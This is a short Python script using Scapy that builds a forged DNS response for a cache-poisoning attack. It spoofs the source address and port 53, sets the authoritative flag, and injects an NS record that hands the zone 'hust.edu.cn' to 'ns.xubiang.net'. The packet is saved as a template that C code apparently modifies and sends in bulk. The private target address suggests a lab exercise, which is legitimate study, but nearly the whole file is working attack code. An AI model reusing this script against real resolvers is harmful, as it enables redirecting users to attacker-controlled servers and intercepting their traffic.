#!/usr/bin/python3
from scapy.all import *

# To be modified: Qdsec[qname], Anssec[rrname],
#                 dns[id], ip[src]

dst_pt = 33333					# DNS Server
src_pt = 53						# Disguised as DNS server
dst_ip = '172.18.0.3'			# DNS Server
src_ip = '201.91.180.3'			# Be modified by C code
zone   = 'hust.edu.cn'			# The Zone to Attack
domain = 'biang.hust.edu.cn'	# Be modified by C code

# Construct the DNS header and payload
Qdsec  = DNSQR(qname  = domain)
Anssec = DNSRR(rrname = domain, type ='A', 
               rdata  = '11.111.111.111', ttl=166666)
NSsec  = DNSRR(rrname = zone, type='NS', 
               rdata  = 'ns.xubiang.net', ttl=166666)
dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1, 
          qdcount=1, qd=Qdsec, 
          ancount=1, an=Anssec,
          nscount=1, ns=NSsec)

# Construct the IP, UDP headers, and the entire packet
ip = IP(dst=dst_ip, src=src_ip, chksum=0)
udp = UDP(dport=dst_pt, sport=src_pt, chksum=0)
pkt = ip/udp/dns

# Save the packet to a file
with open('dns_response.bin', 'wb') as f:
	f.write(bytes(pkt))